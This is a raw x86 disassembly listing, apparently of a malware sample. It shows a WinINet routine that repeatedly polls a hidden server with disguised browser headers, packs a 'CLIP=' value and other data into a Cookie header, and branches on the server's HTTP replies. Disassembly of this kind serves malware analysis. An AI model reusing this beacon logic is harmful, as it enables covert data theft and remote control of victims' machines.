var_42C6C       = dword ptr -42C6Ch
var_42C68       = dword ptr -42C68h
var_42C64       = dword ptr -42C64h
var_42C60       = dword ptr -42C60h
Buffer          = dword ptr -42C5Ch
dwIndex         = dword ptr -42C58h
var_42C54       = byte ptr -42C54h
var_42C50       = dword ptr -42C50h
var_42C40       = dword ptr -42C40h
var_42C3C       = dword ptr -42C3Ch
var_42C38       = byte ptr -42C38h
var_42C37       = dword ptr -42C37h
var_42C33       = dword ptr -42C33h
var_42C2F       = dword ptr -42C2Fh
var_42C2B       = dword ptr -42C2Bh
var_42C27       = dword ptr -42C27h
var_42C23       = dword ptr -42C23h
var_42C1F       = dword ptr -42C1Fh
var_42C1B       = word ptr -42C1Bh
var_42C19       = byte ptr -42C19h
szHeaders       = byte ptr -42C18h
var_42C17       = byte ptr -42C17h
szObjectName    = byte ptr -42818h
var_42817       = byte ptr -42817h
var_42018       = byte ptr -42018h
var_42017       = byte ptr -42017h
var_41C18       = byte ptr -41C18h
var_41C17       = byte ptr -41C17h
var_41018       = byte ptr -41018h
var_41017       = byte ptr -41017h
var_40024       = byte ptr -40024h
var_40020       = dword ptr -40020h
var_4001C       = dword ptr -4001Ch
var_40018       = byte ptr -40018h
var_40017       = byte ptr -40017h
var_14          = dword ptr -14h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4

                push    ebp
                mov     ebp, esp
                and     esp, 0FFFFFFF8h
                push    0FFFFFFFFh
                push    offset SEH_401E10
                mov     eax, large fs:0
                push    eax
                push    ecx
                mov     eax, 42C94h
                call    __alloca_probe
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+42CA4h+var_14], eax
                push    ebx
                push    esi
                push    edi
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+42CB4h+var_C]
                mov     large fs:0, eax
                xor     ebx, ebx
                mov     [esp+42CB4h+hInternet], ebx
                mov     [esp+42CB4h+hConnect], ebx
                lea     eax, [esp+42CB4h+var_42C9C]
                mov     [esp+42CB4h+var_4], ebx
                mov     esi, eax
                mov     dword_42C7A8, eax
                call    sub_40DF40
                push    ebx             ; dwContext
                cmp     dword_42C344, ebx
                jz      short loc_401E99
                mov     ecx, [esp+42CB8h+hInternet]
                push    800000h
                push    3
                push    ebx
                push    ebx
                push    1BBh
                push    offset szServerName
                push    ecx
                jmp     short loc_401EAA
; ---------------------------------------------------------------------------

loc_401E99:                             ; CODE XREF: sub_401E10+6D↑j
                mov     edx, [esp+42CB8h+hInternet]
                push    ebx             ; dwFlags
                push    3               ; dwService
                push    ebx             ; lpszPassword
                push    ebx             ; lpszUserName
                push    50h             ; nServerPort
                push    offset szServerName ; lpszServerName
                push    edx             ; hInternet

loc_401EAA:                             ; CODE XREF: sub_401E10+87↑j
                call    ds:InternetConnectA
                mov     [esp+42CB4h+hConnect], eax
                cmp     eax, ebx
                jnz     short loc_401ECB
                mov     eax, [esp+42CB4h+hInternet]
                cmp     eax, ebx
                jz      short loc_401ECB
                push    eax             ; hInternet
                call    ds:InternetCloseHandle
                mov     [esp+42CB4h+hInternet], ebx

loc_401ECB:                             ; CODE XREF: sub_401E10+A6↑j
                                        ; sub_401E10+AE↑j
                push    7FFh
                lea     eax, [esp+42CB8h+var_42817]
                push    ebx
                push    eax
                mov     [esp+42CC0h+szObjectName], bl
                call    sub_413520
                add     esp, 0Ch
                push    ebx
                call    sub_40F8E3
                add     esp, 4
                push    eax
                call    sub_40F127

loc_401EF7:                             ; CODE XREF: sub_401E10+767↓j
                                        ; sub_401E10+7B6↓j
                add     esp, 4
                lea     ebx, [ebx+0]

loc_401F00:                             ; CODE XREF: sub_401E10+68D↓j
                                        ; sub_401E10+757↓j ...
                lea     ecx, [esp+42CB4h+szObjectName]
                push    800h
                push    ecx
                call    sub_403B80
                add     esp, 8
                or      eax, 0FFFFFFFFh
                push    ebx             ; dwContext
                lea     edx, [esp+42CB8h+szObjectName]
                cmp     dword_42C344, ebx
                jz      loc_401FF1
                push    84880000h       ; dwFlags
                push    ebx             ; lplpszAcceptTypes
                push    ebx             ; lpszReferrer
                push    offset szVersion ; "HTTP/1.0"
                push    edx             ; lpszObjectName
                mov     [esp+42CCCh+var_42C78], eax
                mov     [esp+42CCCh+var_42C7C], eax
                mov     eax, [esp+42CCCh+hConnect]
                push    offset szVerb   ; "GET"
                push    eax             ; hConnect
                call    ds:HttpOpenRequestA
                mov     esi, eax
                cmp     esi, ebx
                jnz     short loc_401F62
                xor     edi, edi
                mov     [esp+42CB4h+var_42CA4], edi
                jmp     loc_402078
; ---------------------------------------------------------------------------

loc_401F62:                             ; CODE XREF: sub_401E10+145↑j
                lea     ecx, [esp+42CB4h+dwBufferLength]
                push    ecx             ; lpdwBufferLength
                push    offset dword_42BF9C ; lpBuffer
                push    1Fh             ; dwOption
                push    esi             ; hInternet
                mov     [esp+42CC4h+dwBufferLength], 4
                call    ds:InternetQueryOptionA
                mov     edi, ds:InternetSetOptionA
                or      dword_42BF9C, 3180h
                push    4               ; dwBufferLength
                push    offset dword_42BF9C ; lpBuffer
                push    1Fh             ; dwOption
                push    esi             ; hInternet
                call    edi ; InternetSetOptionA
                push    4               ; dwBufferLength
                lea     edx, [esp+42CB8h+Buffer]
                push    edx             ; lpBuffer
                push    41h             ; dwOption
                push    esi             ; hInternet
                mov     [esp+42CC4h+Buffer], ebx
                call    edi ; InternetSetOptionA
                cmp     [esp+42CB4h+var_42C78], 0FFFFFFFFh
                jz      short loc_401FC9
                push    4               ; dwBufferLength
                lea     eax, [esp+42CB8h+var_42C78]
                push    eax             ; lpBuffer
                push    6               ; dwOption
                push    esi             ; hInternet
                call    edi ; InternetSetOptionA
                test    eax, eax
                jnz     short loc_401FC9
                mov     [esp+42CB4h+var_42CA4], ebx
                jmp     loc_402074
; ---------------------------------------------------------------------------

loc_401FC9:                             ; CODE XREF: sub_401E10+19E↑j
                                        ; sub_401E10+1AE↑j
                cmp     [esp+42CB4h+var_42C7C], 0FFFFFFFFh
                jz      loc_402070
                push    4               ; dwBufferLength
                lea     ecx, [esp+42CB8h+var_42C7C]
                push    ecx             ; lpBuffer
                push    5               ; dwOption
                push    esi             ; hInternet
                call    edi ; InternetSetOptionA
                test    eax, eax
                jnz     loc_402070
                mov     [esp+42CB4h+var_42CA4], ebx
                jmp     loc_402074
; ---------------------------------------------------------------------------

loc_401FF1:                             ; CODE XREF: sub_401E10+116↑j
                push    84080000h       ; dwFlags
                push    ebx             ; lplpszAcceptTypes
                push    ebx             ; lpszReferrer
                push    offset szVersion ; "HTTP/1.0"
                push    edx             ; lpszObjectName
                mov     [esp+42CCCh+var_42C74], eax
                mov     [esp+42CCCh+var_42C8C], eax
                mov     eax, [esp+42CCCh+hConnect]
                push    offset szVerb   ; "GET"
                push    eax             ; hConnect
                call    ds:HttpOpenRequestA
                mov     esi, eax
                cmp     esi, ebx
                jnz     short loc_402022
                mov     [esp+42CB4h+var_42CA4], ebx
                jmp     short loc_402074
; ---------------------------------------------------------------------------

loc_402022:                             ; CODE XREF: sub_401E10+20A↑j
                mov     edi, ds:InternetSetOptionA
                push    4               ; dwBufferLength
                lea     ecx, [esp+42CB8h+dwBufferLength]
                push    ecx             ; lpBuffer
                push    41h             ; dwOption
                push    esi             ; hInternet
                mov     [esp+42CC4h+dwBufferLength], ebx
                call    edi ; InternetSetOptionA
                cmp     [esp+42CB4h+var_42C74], 0FFFFFFFFh
                jz      short loc_402055
                push    4               ; dwBufferLength
                lea     edx, [esp+42CB8h+var_42C74]
                push    edx             ; lpBuffer
                push    6               ; dwOption
                push    esi             ; hInternet
                call    edi ; InternetSetOptionA
                test    eax, eax
                jnz     short loc_402055
                mov     [esp+42CB4h+var_42CA4], ebx
                jmp     short loc_402074
; ---------------------------------------------------------------------------

loc_402055:                             ; CODE XREF: sub_401E10+22D↑j
                                        ; sub_401E10+23D↑j
                cmp     [esp+42CB4h+var_42C8C], 0FFFFFFFFh
                jz      short loc_402070
                push    4               ; dwBufferLength
                lea     eax, [esp+42CB8h+var_42C8C]
                push    eax             ; lpBuffer
                push    5               ; dwOption
                push    esi             ; hInternet
                call    edi ; InternetSetOptionA
                mov     [esp+42CB4h+var_42CA4], ebx
                test    eax, eax
                jz      short loc_402074

loc_402070:                             ; CODE XREF: sub_401E10+1BE↑j
                                        ; sub_401E10+1D2↑j ...
                mov     [esp+42CB4h+var_42CA4], esi

loc_402074:                             ; CODE XREF: sub_401E10+1B4↑j
                                        ; sub_401E10+1DC↑j ...
                mov     edi, [esp+42CB4h+var_42CA4]

loc_402078:                             ; CODE XREF: sub_401E10+14D↑j
                push    3FFh
                lea     ecx, [esp+42CB8h+var_42C17]
                push    ebx
                push    ecx
                mov     [esp+42CC0h+szHeaders], bl
                call    sub_413520
                add     esp, 0Ch
                push    offset aX86     ; "x86"
                push    offset aUaCpu   ; "UA-CPU"
                lea     edx, [esp+42CBCh+szHeaders]
                push    offset aSS      ; "%s: %s"
                push    edx
                call    sub_40E37C
                mov     esi, ds:HttpAddRequestHeadersA
                add     esp, 10h
                push    0A0000000h      ; dwModifiers
                push    0FFFFFFFFh      ; dwHeadersLength
                lea     eax, [esp+42CBCh+szHeaders]
                push    eax             ; lpszHeaders
                push    edi             ; hRequest
                call    esi ; HttpAddRequestHeadersA
                push    3FFh
                lea     ecx, [esp+42CB8h+var_42C17]
                push    ebx
                push    ecx
                mov     [esp+42CC0h+szHeaders], bl
                call    sub_413520
                add     esp, 0Ch
                push    offset aTextHtmlQ09Tex ; "text/html;q=0.9,text/plain;q=0.8,applic"...
                push    offset aAccept  ; "Accept"
                lea     edx, [esp+42CBCh+szHeaders]
                push    offset aSS      ; "%s: %s"
                push    edx
                call    sub_40E37C
                add     esp, 10h
                push    0A0000000h      ; dwModifiers
                push    0FFFFFFFFh      ; dwHeadersLength
                lea     eax, [esp+42CBCh+szHeaders]
                push    eax             ; lpszHeaders
                push    edi             ; hRequest
                call    esi ; HttpAddRequestHeadersA
                push    3FFh
                lea     ecx, [esp+42CB8h+var_42C17]
                push    ebx
                push    ecx
                mov     [esp+42CC0h+szHeaders], bl
                call    sub_413520
                add     esp, 0Ch
                push    offset aEnUs    ; "en-us"
                push    offset aAcceptLanguage ; "Accept-Language"
                lea     edx, [esp+42CBCh+szHeaders]
                push    offset aSS      ; "%s: %s"
                push    edx
                call    sub_40E37C
                add     esp, 10h
                push    0A0000000h      ; dwModifiers
                push    0FFFFFFFFh      ; dwHeadersLength
                lea     eax, [esp+42CBCh+szHeaders]
                push    eax             ; lpszHeaders
                push    edi             ; hRequest
                call    esi ; HttpAddRequestHeadersA
                push    3FFh
                lea     ecx, [esp+42CB8h+var_42C17]
                push    ebx
                push    ecx
                mov     [esp+42CC0h+szHeaders], bl
                call    sub_413520
                add     esp, 0Ch
                push    offset aGzipQ08Deflate ; "gzip;q=0.8, deflate;q=0.5"
                push    offset aAcceptEncoding ; "Accept-Encoding"
                lea     edx, [esp+42CBCh+szHeaders]
                push    offset aSS      ; "%s: %s"
                push    edx
                call    sub_40E37C
                add     esp, 10h
                push    0A0000000h      ; dwModifiers
                push    0FFFFFFFFh      ; dwHeadersLength
                lea     eax, [esp+42CBCh+szHeaders]
                push    eax             ; lpszHeaders
                push    edi             ; hRequest
                call    esi ; HttpAddRequestHeadersA
                push    ebx
                push    offset szProxyBypass
                lea     ecx, [esp+42CBCh+var_42C54]
                mov     [esp+42CBCh+var_42C3C], 0Fh
                mov     [esp+42CBCh+var_42C40], ebx
                mov     byte ptr [esp+42CBCh+var_42C50], bl
                call    sub_409840
                push    0FFFh
                lea     ecx, [esp+42CB8h+var_41017]
                push    ebx
                mov     byte ptr [esp+42CBCh+var_4], 1
                push    ecx
                mov     [esp+42CC0h+var_41018], bl
                call    sub_413520
                mov     eax, offset dword_42C368
                add     esp, 0Ch
                lea     esi, [eax+1]

loc_402205:                             ; CODE XREF: sub_401E10+3FA↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_402205
                sub     eax, esi
                lea     edx, [esp+42CB4h+var_41018]
                push    offset dword_42C368
                push    edx
                mov     esi, eax
                call    sub_404660
                add     esp, 8
                cmp     [esp+42CB4h+var_42C40], ebx
                jz      short loc_402238
                mov     bl, 3Bh
                lea     esi, [esp+42CB4h+var_42C54]
                call    sub_408C10
                xor     ebx, ebx

loc_402238:                             ; CODE XREF: sub_401E10+419↑j
                push    4
                push    offset aClip    ; "CLIP"
                lea     eax, [esp+42CBCh+var_42C54]
                call    sub_409730
                push    1
                push    offset asc_422334 ; "="
                lea     eax, [esp+42CBCh+var_42C54]
                call    sub_409730
                lea     eax, [esp+42CB4h+var_41018]
                lea     edx, [eax+1]

loc_402262:                             ; CODE XREF: sub_401E10+457↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_402262
                sub     eax, edx
                push    eax
                lea     eax, [esp+42CB8h+var_41018]
                push    eax
                lea     eax, [esp+42CBCh+var_42C54]
                call    sub_409730
                cmp     [esp+42CB4h+var_42C3C], 10h
                mov     esi, [esp+42CB4h+var_42C50]
                jnb     short loc_40228C
                lea     esi, [esp+42CB4h+var_42C50]

loc_40228C:                             ; CODE XREF: sub_401E10+476↑j
                push    3FFh
                lea     ecx, [esp+42CB8h+var_42C17]
                push    ebx
                push    ecx
                mov     [esp+42CC0h+szHeaders], bl
                call    sub_413520
                add     esp, 0Ch
                push    esi
                push    offset aCookie  ; "Cookie"
                lea     edx, [esp+42CBCh+szHeaders]
                push    offset aSS      ; "%s: %s"
                push    edx
                call    sub_40E37C
                add     esp, 10h
                push    0A0000000h      ; dwModifiers
                push    0FFFFFFFFh      ; dwHeadersLength
                lea     eax, [esp+42CBCh+szHeaders]
                push    eax             ; lpszHeaders
                push    edi             ; hRequest
                call    ds:HttpAddRequestHeadersA
                push    ebx             ; dwOptionalLength
                push    ebx             ; lpOptional
                push    ebx             ; dwHeadersLength
                push    ebx             ; lpszHeaders
                push    edi             ; hRequest
                call    ds:HttpSendRequestA
                test    eax, eax
                jz      loc_4025CB
                mov     [esp+42CB4h+dwIndex], ebx
                mov     [esp+42CB4h+var_42C70], 4
                cmp     edi, ebx
                jz      loc_4025FF
                mov     esi, ds:HttpQueryInfoA
                lea     ecx, [esp+42CB4h+dwIndex]
                push    ecx             ; lpdwIndex
                lea     edx, [esp+42CB8h+var_42C70]
                push    edx             ; lpdwBufferLength
                lea     eax, [esp+42CBCh+var_42C64]
                push    eax             ; lpBuffer
                push    20000013h       ; dwInfoLevel
                push    edi             ; hRequest
                call    esi ; HttpQueryInfoA
                cmp     eax, ebx
                jz      loc_4025F4
                mov     eax, [esp+42CB4h+var_42C64]
                cmp     eax, 0C8h
                jnz     loc_4024A2
                lea     ecx, [esp+42CB4h+var_42C6C]
                push    ecx             ; lpdwIndex
                lea     edx, [esp+42CB8h+var_42C68]
                push    edx             ; lpdwBufferLength
                lea     eax, [esp+42CBCh+var_42C90]
                push    eax             ; lpBuffer
                push    20000005h       ; dwInfoLevel
                push    edi             ; hRequest
                mov     [esp+42CC8h+var_42C90], ebx
                mov     [esp+42CC8h+var_42C6C], ebx
                mov     [esp+42CC8h+var_42C68], 4
                call    esi ; HttpQueryInfoA
                cmp     eax, ebx
                jz      loc_4025F4
                push    3FFFFh
                lea     ecx, [esp+42CB8h+var_40017]
                push    ebx
                push    ecx
                mov     [esp+42CC0h+var_42C88], ebx
                xor     esi, esi
                mov     [esp+42CC0h+var_40018], bl
                call    sub_413520
                add     esp, 0Ch

loc_402387:                             ; CODE XREF: sub_401E10+5BB↓j
                push    ebx             ; dwContext
                push    ebx             ; dwFlags
                lea     edx, [esp+42CBCh+dwNumberOfBytesAvailable]
                push    edx             ; lpdwNumberOfBytesAvailable
                push    edi             ; hFile
                mov     [esp+42CC4h+dwNumberOfBytesAvailable], ebx
                call    ds:InternetQueryDataAvailable
                test    eax, eax
                jz      loc_4025CB
                mov     ecx, [esp+42CB4h+dwNumberOfBytesAvailable] ; dwNumberOfBytesToRead
                push    edi             ; hFile
                lea     eax, [esp+42CB8h+var_42C9C]
                push    eax             ; int
                lea     edx, [esp+esi+42CBCh+var_40018] ; lpBuffer
                lea     eax, [esp+42CBCh+var_42C88]
                call    sub_40E240
                test    eax, eax
                jz      loc_4025F4
                add     esi, [esp+42CB4h+var_42C88]
                cmp     esi, [esp+42CB4h+var_42C90]
                jb      short loc_402387
                push    3FFh
                lea     ecx, [esp+42CB8h+var_42017]
                push    ebx
                push    ecx
                mov     dword_42C348, 3
                mov     [esp+42CC0h+var_42018], bl
                call    sub_413520
                mov     ebx, [esp+42CC0h+var_42CA4]
                add     esp, 0Ch
                lea     edx, [esp+42CB4h+var_42018]
                push    edx
                lea     edi, [esp+42CB8h+var_42C60]
                mov     [esp+42CB8h+var_42C60], 400h
                call    sub_40E1E0
                push    0BFFh
                lea     eax, [esp+42CB8h+var_41C17]
                push    0
                push    eax
                mov     [esp+42CC0h+var_41C18], 0
                call    sub_413520
                mov     esi, [esp+42CC0h+var_42C90]
                mov     ecx, [esp+esi+42CC0h+var_40020]
                mov     edx, [esp+esi+42CC0h+var_4001C]
                lea     esi, [esp+esi+42CC0h+var_40024]
                add     esp, 0Ch
                push    ecx
                lea     eax, [esp+edx+42CB8h+var_40018]
                push    eax
                lea     ecx, [esp+42CBCh+var_41C18]
                push    ecx
                call    sub_414550
                mov     esi, [esi+4]
                add     esp, 0Ch
                lea     edx, [esp+42CB4h+var_41C18]
                push    esi
                push    edx
                call    sub_4052B0
                add     esp, 8
                cmp     dword_42AA10, 13h
                jz      loc_4025D7
                push    ebx             ; hInternet
                call    ds:InternetCloseHandle
                lea     ecx, [esp+42CB4h+var_42C54]
                mov     byte ptr [esp+42CB4h+var_4], 0
                call    sub_4085D0
                xor     ebx, ebx
                jmp     loc_401F00
; ---------------------------------------------------------------------------

loc_4024A2:                             ; CODE XREF: sub_401E10+51F↑j
                cmp     eax, 130h
                jnz     loc_40257C
                xor     eax, eax
                mov     [esp+42CB4h+var_42C37], eax
                mov     [esp+42CB4h+var_42C33], eax
                mov     [esp+42CB4h+var_42C2F], eax
                mov     [esp+42CB4h+var_42C2B], eax
                mov     [esp+42CB4h+var_42C27], eax
                mov     [esp+42CB4h+var_42C23], eax
                mov     [esp+42CB4h+var_42C1F], eax
                mov     [esp+42CB4h+var_42C1B], ax
                mov     [esp+42CB4h+var_42C19], al
                lea     eax, [esp+42CB4h+var_42C84]
                push    eax             ; lpdwIndex
                lea     ecx, [esp+42CB8h+var_42CA4]
                push    ecx             ; lpdwBufferLength
                push    ebx             ; lpBuffer
                push    17h             ; dwInfoLevel
                push    edi             ; hRequest
                mov     [esp+42CC8h+var_42C38], bl
                mov     [esp+42CC8h+dwBufferLength], 20h
                mov     [esp+42CC8h+var_42C84], ebx
                mov     [esp+42CC8h+var_42CA4], ebx
                call    esi ; HttpQueryInfoA
                mov     edx, [esp+42CB4h+var_42CA4]
                cmp     edx, [esp+42CB4h+dwBufferLength]
                ja      short loc_40253F
                call    ds:GetLastError
                cmp     eax, 7Ah
                jnz     short loc_40253F
                lea     eax, [esp+42CB4h+var_42C84]
                push    eax             ; lpdwIndex
                lea     ecx, [esp+42CB8h+dwBufferLength]
                push    ecx             ; lpdwBufferLength
                lea     edx, [esp+42CBCh+var_42C38]
                push    edx             ; lpBuffer
                push    17h             ; dwInfoLevel
                push    edi             ; hRequest
                call    esi ; HttpQueryInfoA

loc_40253F:                             ; CODE XREF: sub_401E10+70B↑j
                                        ; sub_401E10+716↑j
                push    edi             ; hInternet
                call    ds:InternetCloseHandle
                push    1388h           ; dwMilliseconds
                call    ds:Sleep
                mov     byte ptr [esp+42CB4h+var_4], bl
                cmp     [esp+42CB4h+var_42C3C], 10h
                mov     dword_42C348, 3
                jb      loc_401F00
                mov     eax, [esp+42CB4h+var_42C50]
                push    eax
                call    sub_40F15B
                jmp     loc_401EF7
; ---------------------------------------------------------------------------

loc_40257C:                             ; CODE XREF: sub_401E10+697↑j
                cmp     eax, 194h
                jnz     short loc_4025F4
                mov     esi, edi
                call    sub_404800
                test    eax, eax
                jz      short loc_4025EA
                push    edi             ; hInternet
                call    ds:InternetCloseHandle
                push    1388h           ; dwMilliseconds
                call    ds:Sleep
                mov     byte ptr [esp+42CB4h+var_4], bl
                cmp     [esp+42CB4h+var_42C3C], 10h
                mov     dword_42C348, 3
                jb      loc_401F00
                mov     ecx, [esp+42CB4h+var_42C50]
                push    ecx
                call    sub_40F15B
                jmp     loc_401EF7
; ---------------------------------------------------------------------------

loc_4025CB:                             ; CODE XREF: sub_401E10+4D7↑j
                                        ; sub_401E10+58B↑j
                call    ds:GetLastError
                mov     [esp+42CB4h+var_42C9C], eax
                jmp     short loc_4025F4
; ---------------------------------------------------------------------------

loc_4025D7:                             ; CODE XREF: sub_401E10+66D↑j
                push    0BB8h           ; dwMilliseconds
                call    ds:Sleep
                mov     edi, [esp+42CB4h+var_42CA4]
                xor     ebx, ebx
                jmp     short loc_4025F4
; ---------------------------------------------------------------------------

loc_4025EA:                             ; CODE XREF: sub_401E10+77C↑j
                mov     dword_42AA10, 14h

loc_4025F4:                             ; CODE XREF: sub_401E10+510↑j
                                        ; sub_401E10+54E↑j ...
                cmp     edi, ebx
                jz      short loc_4025FF
                push    edi             ; hInternet
                call    ds:InternetCloseHandle

loc_4025FF:                             ; CODE XREF: sub_401E10+4EB↑j
                                        ; sub_401E10+7E6↑j
                mov     eax, dword_42AA10
                cmp     eax, 13h
                jz      short loc_402682
                cmp     eax, 14h
                jz      short loc_402682
                cmp     eax, 19h
                jz      short loc_402682
                mov     eax, [esp+42CB4h+var_42C9C]
                cmp     eax, 2EFDh
                jnz     short loc_40262A
                mov     dword_42AA10, 10h
                jmp     short loc_402674
; ---------------------------------------------------------------------------

loc_40262A:                             ; CODE XREF: sub_401E10+80C↑j
                cmp     eax, 2EFEh
                jnz     short loc_40263D
                mov     dword_42AA10, 12h
                jmp     short loc_402674
; ---------------------------------------------------------------------------

loc_40263D:                             ; CODE XREF: sub_401E10+81F↑j
                cmp     eax, 2F78h
                jnz     short loc_402650
                mov     dword_42AA10, 16h
                jmp     short loc_402674
; ---------------------------------------------------------------------------

loc_402650:                             ; CODE XREF: sub_401E10+832↑j
                cmp     eax, 2EE2h
                jnz     short loc_402663
                mov     dword_42AA10, 11h
                jmp     short loc_402674
; ---------------------------------------------------------------------------

loc_402663:                             ; CODE XREF: sub_401E10+845↑j
                cmp     eax, 2EE7h
                jnz     short loc_402674
                mov     dword_42AA10, 18h

loc_402674:                             ; CODE XREF: sub_401E10+818↑j
                                        ; sub_401E10+82B↑j ...
                cmp     [esp+42CB4h+var_42C3C], 10h
                jb      short loc_402696
                mov     edx, [esp+42CB4h+var_42C50]
                push    edx
                jmp     short loc_40268E
; ---------------------------------------------------------------------------

loc_402682:                             ; CODE XREF: sub_401E10+7F7↑j
                                        ; sub_401E10+7FC↑j ...
                cmp     [esp+42CB4h+var_42C3C], 10h
                jb      short loc_402696
                mov     eax, [esp+42CB4h+var_42C50]
                push    eax

loc_40268E:                             ; CODE XREF: sub_401E10+870↑j
                call    sub_40F15B
                add     esp, 4

loc_402696:                             ; CODE XREF: sub_401E10+869↑j
                                        ; sub_401E10+877↑j
                mov     eax, hThread
                mov     esi, ds:WaitForSingleObject
                mov     edi, ds:TerminateThread
                mov     byte ptr [esp+42CB4h+var_42C50], bl
                mov     [esp+42CB4h+var_42C40], ebx
                mov     [esp+42CB4h+var_42C3C], 0Fh
                cmp     eax, ebx
                jz      short loc_4026DB
                push    5DCh            ; dwMilliseconds
                push    eax             ; hHandle
                call    esi ; WaitForSingleObject
                cmp     eax, 102h
                jnz     short loc_4026D5
                mov     ecx, hThread
                push    1               ; dwExitCode
                push    ecx             ; hThread
                call    edi ; TerminateThread

loc_4026D5:                             ; CODE XREF: sub_401E10+8B8↑j
                mov     hThread, ebx

loc_4026DB:                             ; CODE XREF: sub_401E10+8A9↑j
                call    sub_407850
                mov     eax, dword_42C35C
                cmp     eax, ebx
                jz      short loc_402709
                push    5DCh            ; dwMilliseconds
                push    eax             ; hHandle
                call    esi ; WaitForSingleObject
                cmp     eax, 102h
                jnz     short loc_402703
                mov     edx, dword_42C35C
                push    1               ; dwExitCode
                push    edx             ; hThread
                call    edi ; TerminateThread

loc_402703:                             ; CODE XREF: sub_401E10+8E6↑j
                mov     dword_42C35C, ebx

loc_402709:                             ; CODE XREF: sub_401E10+8D7↑j
                mov     eax, dword_42C358
                cmp     eax, ebx
                jz      short loc_402731
                push    5DCh            ; dwMilliseconds
                push    eax             ; hHandle
                call    esi ; WaitForSingleObject
                cmp     eax, 102h
                jnz     short loc_40272B
                mov     eax, dword_42C358
                push    1               ; dwExitCode
                push    eax             ; hThread
                call    edi ; TerminateThread

loc_40272B:                             ; CODE XREF: sub_401E10+90F↑j
                mov     dword_42C358, ebx

loc_402731:                             ; CODE XREF: sub_401E10+900↑j
                mov     eax, dword_42BF98
                cmp     eax, ebx
                jz      short loc_40275A
                push    5DCh            ; dwMilliseconds
                push    eax             ; hHandle
                call    esi ; WaitForSingleObject
                cmp     eax, 102h
                jnz     short loc_402754
                mov     ecx, dword_42BF98
                push    1               ; dwExitCode
                push    ecx             ; hThread
                call    edi ; TerminateThread

loc_402754:                             ; CODE XREF: sub_401E10+937↑j
                mov     dword_42BF98, ebx

loc_40275A:                             ; CODE XREF: sub_401E10+928↑j
                mov     eax, [esp+42CB4h+hConnect]
                cmp     eax, ebx
                jz      short loc_40276D
                push    eax             ; hInternet
                call    ds:InternetCloseHandle
                mov     [esp+42CB4h+hConnect], ebx

loc_40276D:                             ; CODE XREF: sub_401E10+950↑j
                mov     eax, [esp+42CB4h+hInternet]
                cmp     eax, ebx
                jz      short loc_40277C
                push    eax             ; hInternet
                call    ds:InternetCloseHandle

loc_40277C:                             ; CODE XREF: sub_401E10+963↑j
                xor     eax, eax
                mov     ecx, [esp+42CB4h+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     ecx, [esp+42CA4h+var_14]
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     esp, ebp
                pop     ebp
                retn    4
sub_401E10      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_4027B0      proc near               ; DATA XREF: sub_401AE0+133↑o

var_2C          = byte ptr -2Ch
var_28          = dword ptr -28h
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4

                push    0FFFFFFFFh
                push    offset SEH_4027B0
                mov     eax, large fs:0
                push    eax
                sub     esp, 20h
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+2Ch+var_10], eax
                push    ebx
                push    ebp
                push    esi
                push    edi
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+40h+var_C]
                mov     large fs:0, eax
                mov     eax, hEvent
                mov     esi, ds:WaitForSingleObject
                xor     ebx, ebx
                push    ebx             ; dwMilliseconds
                push    eax             ; hHandle
                call    esi ; WaitForSingleObject
                test    eax, eax
                jz      loc_4029D3
                mov     ebp, ds:Sleep

loc_402801:                             ; CODE XREF: sub_4027B0+21D↓j
                push    ebx
                push    offset szProxyBypass
                lea     ecx, [esp+48h+var_2C]
                mov     [esp+48h+var_14], 0Fh
                mov     [esp+48h+var_18], ebx
                mov     byte ptr [esp+48h+var_28], bl
                call    sub_409840
                push    offset CriticalSection ; lpCriticalSection
                mov     [esp+44h+var_4], ebx
                call    ds:EnterCriticalSection
                mov     ecx, dword_42C8E4
                cmp     ecx, ebx
                jbe     loc_402925
                mov     eax, dword_42C8E0

loc_402842:                             ; CODE XREF: sub_4027B0+1B1↓j
                add     ecx, eax
                mov     esi, eax
                cmp     eax, ecx
                jbe     short loc_40284F
                call    sub_40EC7A

loc_40284F:                             ; CODE XREF: sub_4027B0+98↑j
                mov     eax, dword_42C8C8
                mov     edi, eax
                cmp     eax, ebx
                jnz     short loc_40287A
                call    sub_40EC7A
                xor     eax, eax
                xor     ecx, ecx

loc_402863:                             ; CODE XREF: sub_4027B0+CE↓j
                mov     edx, [ecx+1Ch]
                add     edx, [eax+18h]
                cmp     esi, edx
                jb      short loc_402872
                call    sub_40EC7A

loc_402872:                             ; CODE XREF: sub_4027B0+BB↑j
                cmp     edi, ebx
                jz      short loc_402880
                mov     eax, [edi]
                jmp     short loc_402882
; ---------------------------------------------------------------------------

loc_40287A:                             ; CODE XREF: sub_4027B0+A8↑j
                mov     eax, [eax]
                mov     ecx, eax
                jmp     short loc_402863
; ---------------------------------------------------------------------------

loc_402880:                             ; CODE XREF: sub_4027B0+C4↑j
                xor     eax, eax

loc_402882:                             ; CODE XREF: sub_4027B0+C8↑j
                cmp     [eax+14h], esi
                ja      short loc_402894
                cmp     edi, ebx
                jz      short loc_40288F
                mov     eax, [edi]
                jmp     short loc_402891
; ---------------------------------------------------------------------------

loc_40288F:                             ; CODE XREF: sub_4027B0+D9↑j
                xor     eax, eax

loc_402891:                             ; CODE XREF: sub_4027B0+DD↑j
                sub     esi, [eax+14h]

loc_402894:                             ; CODE XREF: sub_4027B0+D5↑j
                cmp     edi, ebx
                jz      short loc_40289C
                mov     eax, [edi]
                jmp     short loc_40289E
; ---------------------------------------------------------------------------

loc_40289C:                             ; CODE XREF: sub_4027B0+E6↑j
                xor     eax, eax

loc_40289E:                             ; CODE XREF: sub_4027B0+EA↑j
                mov     eax, [eax+10h]
                mov     eax, [eax+esi*4]
                push    ebx
                push    eax
                or      eax, 0FFFFFFFFh
                lea     esi, [esp+48h+var_2C]
                call    sub_409640
                mov     ecx, dword_42C8E4
                cmp     ecx, ebx
